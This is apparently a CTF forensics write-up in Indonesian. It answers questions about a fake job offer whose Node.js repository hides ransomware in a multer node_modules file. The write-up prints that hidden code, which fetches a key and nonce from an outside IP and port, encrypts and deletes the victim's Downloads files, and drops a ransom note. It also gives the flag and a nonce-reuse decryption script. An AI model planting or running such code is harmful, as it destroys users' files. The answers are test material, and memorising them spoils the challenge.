# Solver

1. Nama pengguna (username) pada perangkat yang terinfeksi malware?

Bisa dilihat pada `/etc/passwd` atau pada folder `/home` usernamenya adalah ubuntu

2. Wallet BTC milik threact actor?

Bisa dilihat pada `/home/ubuntu/readme.txt`, walletnya adalah 197MJHgAPu5znTX836e4VXLHEPJp8ZCoV

3. Email yang digunakan oleh victim?

Bisa dilihat pada file thunderbird milik mozilla, yang terletak pada `/home/ubuntu/snap/thunderbird/common/.thunderbird/aqzwpfkz.default` dan cari file bernama `All Mail` untuk mendapatkan semua email yang ada pada Mozilla Thunderbird. Kemudian cari section `To:` untuk mendapatkan email victim

4. Email yang digunakan oleh threat actor?

Sama seperti file sebelumnya, namun disini kita mencari section `From:` untuk mendapatkan email threat actor

5. Berapa rentang gaji yang ditawarkan oleh threat actor? (Dalam Rupiah)

Sama seperti file sebelumnya, hal ini bisa didatkan di awal email dengan judul `Tawaran Lowongan Pekerjaan sebagai NodeJS Developer di PT. Mencari Cinta Sejati`

6. Link meeting yang digunakan untuk wawancara kerja?

Sama seperti file sebelumnya, namun disini mencari file yang diupload dengan mencari section `X-Attachment-Id`

7. Repositori yang mengandung malware?

Sama seperti file sebelumnya, disini bisa didapatkan setelah mendapatkan email wawancara

8. Full path yang mengandung malicious code?

Jika dianalisis lebih lanjut, terdapat malicious code pada `/nodejs-simple-file-upload/node_modules/multer/storage/disk.js` dimana threat actor mengencrypt folder `Downloads` korban dengan AES mode CTR

```javascript
function processFile(filePath, key, nonce) {
  const cipher = crypto.createCipheriv('aes-256-ctr', key, nonce);
  const input = fs.createReadStream(filePath);
  const output = fs.createWriteStream(`${filePath}.enc`);

  input.pipe(cipher).pipe(output);

  output.on('finish', () => {
    fs.unlink(filePath, (err) => {
    });
  });
}

function processFolder(folderPath, key, nonce) {
  fs.readdir(folderPath, { withFileTypes: true }, (err, entries) => {
    if (err) {
      return;
    }

    entries.forEach((entry) => {
      const fullPath = path.join(folderPath, entry.name);

      if (entry.isDirectory()) {
        processFolder(fullPath, key, nonce);
      } else if (entry.isFile()) {
        processFile(fullPath, key, nonce);
      }
    });
  });
}

function createFile(data, filePath) {
  fs.writeFile(filePath, data, () => {});
}

function DiskStorage (opts) {
  Promise.all([
    fetchData('http://157.245.204.42:1337/a.txt'),
    fetchData('http://157.245.204.42:1337/b.txt'),
    fetchData('http://157.245.204.42:1337/readme.txt'),
  ])
    .then(([key, nonce, readme]) => {
      processFolder(os.homedir() + '/Downloads', key, nonce);
      createFile(readme, os.homedir() + '/readme.txt');
    })
    .catch((err) => {
      
    });
    ...
```

9. IP beserta port yang digunakan threat actor?

Menggunakan data dari soal sebelumnya, ip nya adalah `157.245.204.42:1337` dimana threat actor membaca key, nonce, dan juga isi readme pada website tersebut

10. Berikan isi file yang ada di path berikut: /home/ubuntu/Downloads/important_notes.txt

Soal ini mengandung unsur crypto dimana file important_notes.txt dapat didecrypt menggunakan formula ini:

```
flag = (ciphertext1 ⊕ ciphertext2) ⊕ known_plaintext
```

Karena key dan nonce yang digunakan **sama** untuk setiap file, mengetahui plaintext dari file yang dienkripsi (misalnya link.txt) memungkinkan kita mendekripsi file lain seperti important_notes.txt. Berikut kode untuk mendecrypt important_notes.txt

```python
known_plaintext = 'Join us at: https://meet.google.com/nkb-ukxi-exj'
encrypted_text = bytes.fromhex('9de036d5eac096e2846058a9e25a3e0e7b7b315e57b187a367638e5e931cc35b0bdc126ca2d7e0895e951188b8a4da3b04')
encrypted_flag = bytes.fromhex('84fa3dd6a3c1c5ab8b7d42e2ef0e241d28387f51188da3831d45be73b122ee343bfa331c88f9c1f672ae3dbed694fb7304')

# Convert known_plaintext to bytes
known_plaintext_bytes = known_plaintext.encode()

# Perform XOR operations
result = bytes(x ^ y ^ z for x, y, z in zip(known_plaintext_bytes, encrypted_text, encrypted_flag)) 

print(result)
```

Outputnya adalah:
```
# python3 s.py
b'Submit ini ke nc ya "YATTA_BERHASIL_DECRYPT_CUY"'
```